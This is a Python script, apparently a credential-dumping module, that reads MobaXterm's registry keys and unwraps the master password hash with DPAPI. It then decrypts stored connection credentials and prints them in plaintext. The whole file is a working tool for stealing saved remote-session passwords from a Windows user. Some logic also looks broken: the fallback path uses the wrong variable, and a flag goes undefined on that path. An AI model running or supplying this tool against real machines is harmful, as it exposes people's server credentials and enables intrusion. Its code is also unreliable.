#!/usr/bin/env python3
import sys, os, platform, random, base64, itertools, winreg
from Crypto.Cipher import AES
from DPAPI import *
from base64 import *

if platform.system().lower() != 'windows':
    print('Please run this script in Windows.')
    exit(-1)


class MobaXtermCrypto:

    def __init__(self, SysHostname: bytes, SysUsername: bytes, SessionP: bytes = None):
        self._SysHostname = SysHostname
        self._SysUsername = SysUsername
        self._SessionP = SessionP

    def _KeyCrafter(self, **kargs) -> bytes:
        if kargs.get('ConnHostname') != None and kargs.get('ConnUsername') != None:
            s1 = self._SysUsername + self._SysHostname
            while len(s1) < 20:
                s1 = s1 + s1

            s2 = kargs.get('ConnUsername') + kargs.get('ConnHostname')
            while len(s2) < 20:
                s2 = s2 + s2

            key_space = [
                s1.upper(),
                s2.upper(),
                s1.lower(),
                s2.lower()
            ]
        else:
            s = self._SessionP
            while len(s) < 20:
                s = s + s

            key_space = [
                s.upper(),
                s.upper(),
                s.lower(),
                s.lower()
            ]

        key = bytearray(b'0d5e9n1348/U2+67')
        for i in range(0, len(key)):
            b = key_space[(i + 1) % len(key_space)][i]
            if (b not in key) and (b in b'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/'):
                key[i] = b

        return bytes(key)

    def DecryptPassword(self, Ciphertext: str, ConnHostname: bytes, ConnUsername: bytes) -> bytes:
        key = self._KeyCrafter(ConnHostname=ConnHostname, ConnUsername=ConnUsername)

        ct = bytearray()
        for char in Ciphertext.encode('ascii'):
            if char in key:
                ct.append(char)

        if len(ct) % 2 == 0:
            pt = bytearray()
            for i in range(0, len(ct), 2):
                l = key.find(ct[i])
                key = key[-1:] + key[0:-1]
                h = key.find(ct[i + 1])
                key = key[-1:] + key[0:-1]
                assert (l != -1 and h != -1)
                pt.append(16 * h + l)
            return bytes(pt)
        else:
            raise ValueError('Invalid ciphertext.')

    def DecryptCredential(self, Ciphertext: str) -> bytes:
        key = self._KeyCrafter()

        ct = bytearray()
        for char in Ciphertext.encode('ascii'):
            if char in key:
                ct.append(char)

        if len(ct) % 2 == 0:
            pt = bytearray()
            for i in range(0, len(ct), 2):
                l = key.find(ct[i])
                key = key[-1:] + key[0:-1]
                h = key.find(ct[i + 1])
                key = key[-1:] + key[0:-1]
                assert (l != -1 and h != -1)
                pt.append(16 * h + l)
            return bytes(pt)
        else:
            raise ValueError('Invalid ciphertext.')


class MobaXtermCryptoSafe:

    def __init__(self, MasterPasswordHash: bytes):
        self._Key = b64decode(MasterPasswordHash)[0:32]

    def DecryptPassword(self, Ciphertext: str) -> bytes:
        iv = AES.new(key=self._Key, mode=AES.MODE_ECB).encrypt(b'\x00' * AES.block_size)
        cipher = AES.new(key=self._Key, iv=iv, mode=AES.MODE_CFB, segment_size=8)
        return cipher.decrypt(base64.b64decode(Ciphertext))

    def DecryptCredential(self, Ciphertext: str) -> bytes:
        return self.DecryptPassword(Ciphertext)


class MobaXTerm():

    def run(self):
            print("----Running MobaXTerm Password Decryptor----\n")
            Entropy, ValueType = winreg.QueryValueEx(
                winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    'Software\\Mobatek\\MobaXterm'
                ),
                'SessionP'
            );
            assert (ValueType == winreg.REG_SZ)

            try:
                Key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Mobatek\\MobaXterm\\M')
                print('MasterPasswordHash'.center(48, '-'))
                Value, ValueType = winreg.QueryValueEx(Key, os.getlogin() + '@' + platform.node())
                MasterPasswordHashEncrypted = bytes.fromhex('01000000d08c9ddf0115d1118c7a00c04fc297eb') + b64decode(Value)
                MasterPasswordHash = CryptUnprotectData(MasterPasswordHashEncrypted, bytes(Entropy, 'utf-8'))
                if not MasterPasswordHash:
                    return False
                cipher = MobaXtermCryptoSafe(MasterPasswordHash)
                print(str(MasterPasswordHash) + '\n')
                masterPasswordUse = 1

            except FileNotFoundError:
                cipher = MobaXtermCrypto(
                    platform.node().encode('ansi'),
                    os.getlogin().encode('ansi'),
                    Value.encode('ansi')
                )

            try:
                Key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Mobatek\\MobaXterm\\C')
                print('Credentials'.center(48, '-'))
                for i in itertools.count(0):
                    try:
                        ValueName, Value, ValueType = winreg.EnumValue(Key, i)
                        assert (ValueType == winreg.REG_SZ)
                        CredentialUsername, CredentialPassword = Value.split(':')
                        CredentialPassword = cipher.DecryptCredential(
                            CredentialPassword
                        ).decode('ansi')
                        print('[*] Name:     %s' % ValueName)
                        print('[*] Username: %s' % CredentialUsername)
                        print('[*] Password: %s' % CredentialPassword)
                        print('')
                    except OSError:
                        break
            except FileNotFoundError:
                pass

            try:
                Key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Mobatek\\MobaXterm\\P')
                print('Passwords'.center(48, '-'))
                for i in itertools.count(0):
                    try:
                        ValueName, Value, ValueType = winreg.EnumValue(Key, i)
                        assert (ValueType == winreg.REG_SZ)

                        ConnUsername, ConnHostname = ValueName.split('@')
                        if ':' in ConnUsername:
                            ConnUsername = ConnUsername.split(':')[-1]

                        if masterPasswordUse == 1:
                            ConnPassword = cipher.DecryptPassword(
                                Value
                            ).decode('ansi')

                        else:
                            ConnPassword = cipher.DecryptPassword(
                                Value,
                                ConnHostname.encode('ansi'),
                                ConnUsername.encode('ansi')
                            ).decode('ansi')

                        print('[*] Name:     %s' % ValueName)
                        print('[*] Password: %s' % ConnPassword)
                        print('')
                    except OSError:
                        break
            except FileNotFoundError:
                pass
